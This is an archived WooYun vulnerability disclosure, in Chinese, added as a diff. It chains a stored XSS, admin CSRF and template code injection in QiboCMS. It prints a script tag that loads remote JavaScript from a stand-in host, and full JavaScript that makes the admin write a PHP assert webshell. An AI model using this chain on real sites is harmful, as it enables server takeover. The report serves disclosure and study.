@@ -1,0 +1,223 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		齐博CMS存储型XSS可getshell（组合利用）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		齐博CMS存储型XSS可getshell（组合利用）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/do9gy">do9gy</a> 
+</li><li>提交时间：		2014-01-20 15:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-25：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">齐博cms,利用威胁不大的前台存储型xss+没有任何危害的后台CSRF+几乎无影响可忽略的后台getshell 3个0day 结合起来的威力拿下齐博cms,虽然不算什么严重的漏洞,但是中途遇到的问题和突破还是聊以慰藉的,还请各位看官轻轻拍砖. ——by pandas</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">前一段时间西毒爆出qibocms 0day的时候 就看过齐博cms的代码,发现了几个后台的getshell,后台getshell很多,拿不出手,厂商也是无影响积极忽略的态度,后台提交表单基本都存在CSRF,如果能有一个前台的getshell威力应该会增加许多,于是就去前台黑盒挖出了一个xss.这样结合起来就可以getshell了.<br />
+<br />
+1.存储型XSS位置:会员中心-&gt;万能表单-&gt;发布信息-&gt;版主申请:<br />
+<br />
+postdb[sortname][] 的提交值没有经过过滤,但是进行了长度限制,不过这个长度足以写&lt;script src=&quot;http://xxx.com/1.js&quot;&gt;,提交之后需要管理员在后台-&gt;快捷菜单-&gt;万能表单模型管理-&gt;版主申请-&gt;管理-&gt;查看详情 处触发.发现斜杠被替换了所以改用反斜杠&lt;script src=&quot;http:\\xxx.com\1.js&quot;&gt;. 1.js是我们需要外部加载的内容.这里需要提交一个表单,位于  后台系统功能-&gt;插件管理-&gt;积分介绍管理（jfadmin_mod）修改积分介绍其中的任何一个，在标题或内容处插入${@phpinfo();}。便可以造成代码执行.<br />
+<br />
+于是就提交一个php写文件的代码即可.<br />
+<br />
+1.js内容如下:<br />
+<br />
+</p><pre><code>thisTHost = top.location.hostname;<br />
+thisTHost = &quot;http://&quot;+thisTHost+&quot;/v7/admin/index.php?lfj=jfadmin&amp;action=addjf&quot;;<br />
+function PostSubmit(url) { <br />
+    var postUrl = url;<br />
+    var ExportForm = document.createElement(&quot;FORM&quot;); <br />
+    document.body.appendChild(ExportForm); <br />
+    ExportForm.method = &quot;POST&quot;; <br />
+    var newElement = document.createElement(&quot;input&quot;); <br />
+    newElement.setAttribute(&quot;name&quot;, &quot;title&quot;); <br />
+    var newElement2 = document.createElement(&quot;input&quot;); <br />
+    newElement2.setAttribute(&quot;name&quot;, &quot;fid&quot;); <br />
+    var newElement3 = document.createElement(&quot;input&quot;); <br />
+    newElement3.setAttribute(&quot;name&quot;, &quot;list&quot;);<br />
+    var newElement4 = document.createElement(&quot;input&quot;); <br />
+    newElement4.setAttribute(&quot;name&quot;, &quot;content&quot;); <br />
+    ExportForm.appendChild(newElement); <br />
+    ExportForm.appendChild(newElement2); <br />
+    ExportForm.appendChild(newElement3);<br />
+    ExportForm.appendChild(newElement4);<br />
+    newElement.value = &quot;${@fwrite(fopen(&#039;doggy.php&#039;, &#039;w+&#039;), &#039;&lt;?php assert($_POST[aaa]);?&gt;&#039;)}&quot;; <br />
+    newElement2.value = 1;<br />
+    newElement3.value = 1; <br />
+    newElement4.value = 1; <br />
+    ExportForm.action = postUrl; <br />
+    ExportForm.submit(); <br />
+};<br />
+PostSubmit(thisTHost);</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">分为两个部分证明:<br />
+<br />
+1.用户部分<br />
+<br />
+1)登录<br />
+<br />
+</p><p class="detail"><a href="../images/201527594c5151b73cb9f8869d899fb70525f4c3.jpg" target="_blank"><img src="../images/201527594c5151b73cb9f8869d899fb70525f4c3.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2)写xss<br />
+<br />
+</p><p class="detail"><a href="../images/2015284841c3de9fdaac006e16bad5d489d43b73.jpg" target="_blank"><img src="../images/2015284841c3de9fdaac006e16bad5d489d43b73.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.管理员部分<br />
+<br />
+查看申请<br />
+<br />
+</p><p class="detail"><a href="../images/2015293135a27cc1908053c5b136125598b7f291.jpg" target="_blank"><img src="../images/2015293135a27cc1908053c5b136125598b7f291.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+在网站/admin目录下会增加doggy.php<br />
+<br />
+</p><p class="detail"><a href="../images/2015302220f7795c4e8afef45f3f4a711619cce7.jpg" target="_blank"><img src="../images/2015302220f7795c4e8afef45f3f4a711619cce7.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+内容:<br />
+<br />
+</p><p class="detail"><a href="../images/2015304557a1bd690496cc42b813bcb3dd61da88.jpg" target="_blank"><img src="../images/2015304557a1bd690496cc42b813bcb3dd61da88.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">重视即可修复 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/do9gy" title="do9gy">do9gy</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049360" title="齐博CMS存储型XSS可getshell（组合利用）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-01-20 15:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49360";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
